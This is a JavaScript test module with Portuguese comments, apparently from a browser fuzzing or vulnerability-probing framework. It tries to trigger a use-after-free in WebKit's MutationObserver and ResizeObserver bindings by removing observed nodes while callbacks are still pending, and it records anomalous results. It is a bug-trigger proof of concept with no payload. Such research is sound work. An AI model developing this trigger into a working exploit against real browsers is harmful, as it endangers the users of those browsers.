/**
 * SC_NATIVE_CALLBACK_UAF.JS
 * Categoria : DOM — Use-After-Free (Native Callback)
 * Alvo      : WebCore::MutationObserver / ResizeObserver C++ bindings
 * Técnica   : Registra MutationObserver e ResizeObserver em elementos,
 *             remove os elementos e desconecta os observers, forçando
 *             o motor a disparar callbacks pendentes sobre nós liberados.
 *             Microtask queue pode conter referências stale ao C++ node.
 * Referência: WebKit MutationObserver deliver-mutations-after-free pattern
 */

export default {
    id:          'NATIVE_CALLBACK_UAF',
    category:    'DOM',
    risk:        'HIGH',
    description: 'MutationObserver/ResizeObserver disparam callbacks '
                + 'sobre nós já removidos do DOM antes do disconnect().',

    /* ── estado interno ──────────────────────────────────────────────── */
    _container:     null,
    _target:        null,
    _mutObs:        null,
    _resObs:        null,
    _mutRecords:    [],
    _resEntries:    [],
    _mutCount:      0,
    _resCount:      0,

    supported: function() {
        return typeof MutationObserver !== 'undefined';
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._mutRecords = [];
        this._resEntries = [];
        this._mutCount   = 0;
        this._resCount   = 0;

        this._container = document.createElement('div');
        this._container.style.cssText = 'width:100px;height:100px;position:absolute;left:-9999px';
        document.body.appendChild(this._container);

        this._target = document.createElement('div');
        this._target.style.cssText = 'width:50px;height:50px;background:red';
        this._target.textContent = 'mutation-target';
        this._container.appendChild(this._target);

        // MutationObserver
        this._mutObs = new MutationObserver((records) => {
            this._mutCount += records.length;
            this._mutRecords.push(...records.map(r => ({
                type:    r.type,
                target:  r.target?.nodeName ?? 'null',
                added:   r.addedNodes?.length,
                removed: r.removedNodes?.length,
            })));
        });
        this._mutObs.observe(this._target, {
            childList: true, subtree: true,
            attributes: true, characterData: true
        });

        // ResizeObserver (se disponível)
        if (typeof ResizeObserver !== 'undefined') {
            this._resObs = new ResizeObserver((entries) => {
                this._resCount += entries.length;
                this._resEntries.push(...entries.map(e => ({
                    w: e.contentRect?.width,
                    h: e.contentRect?.height,
                })));
            });
            this._resObs.observe(this._target);
        }

        // Provoca mutações para popular a queue
        this._target.appendChild(document.createTextNode('a'));
        this._target.setAttribute('data-uaf', '1');
        void this._target.offsetWidth;
        await new Promise(r => setTimeout(r, 10));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        // Fila mais mutações ANTES de remover (ficam pendentes na microtask queue)
        this._target.setAttribute('data-uaf', '2');
        this._target.appendChild(document.createElement('span'));

        // Remove imediatamente — C++ node pode ser libertado antes dos callbacks
        this._target.remove();
        void document.body.offsetWidth;

        // Altera atributos no nó já removido para forçar callbacks
        try { this._target.setAttribute('data-uaf', '3'); } catch(_) {}
        try { this._target.style.width = '99px';          } catch(_) {}

        // Agora desconecta — callbacks pendentes podem disparar pós-free
        try { this._mutObs.disconnect(); } catch(_) {}
        try { this._resObs?.disconnect(); } catch(_) {}

        // Força entrega das mutações pendentes
        try { this._mutObs.takeRecords(); } catch(_) {}

        await new Promise(r => setTimeout(r, 20));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-3] estado do nó removido
        s => s._target.isConnected,
        s => s._target.nodeType,
        s => s._target.nodeName,
        s => s._target.getAttribute('data-uaf'),

        // [4-7] callbacks do MutationObserver
        s => s._mutCount,
        s => s._mutRecords.length,
        s => s._mutRecords[0]?.type ?? 'null',
        s => s._mutRecords.find(r => r.target === 'null') ? 'ghost-target' : 'clean',

        // [8-10] callbacks do ResizeObserver
        s => s._resCount,
        s => s._resEntries[0]?.w ?? 'null',
        s => s._resEntries.some(e => e.w === 0 && e.h === 0) ? 'zero-entry' : 'ok',

        // [11] records pendentes após disconnect
        s => { try { return s._mutObs.takeRecords().length; } catch(e) { return -1; } },
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        try { this._mutObs?.disconnect(); } catch(_) {}
        try { this._resObs?.disconnect(); } catch(_) {}
        this._container?.remove();
        this._container  = null;
        this._target     = null;
        this._mutObs     = null;
        this._resObs     = null;
        this._mutRecords = [];
        this._resEntries = [];
        this._mutCount   = 0;
        this._resCount   = 0;
    }
};
